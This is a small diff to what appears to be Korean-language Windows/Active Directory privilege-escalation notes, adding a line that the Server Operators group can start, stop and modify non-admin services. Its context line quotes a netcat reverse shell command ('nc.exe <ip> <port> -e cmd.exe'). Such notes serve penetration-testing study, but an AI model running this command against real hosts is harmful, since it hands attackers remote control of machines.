@@ -590,6 +590,7 @@ c:\temp\nc.exe <ip> <port> -e cmd.exe
 ---
 <details>
  <summary><strong>Server Operators Group</strong></summary>
+- 도메인 컨트롤러를 관리할 수 있는 기능을 가지는데, Administrators 전용이 아닌 서비스에 대해 시작/중지/수정 권한을 가짐.
 
 ```powershell
 services
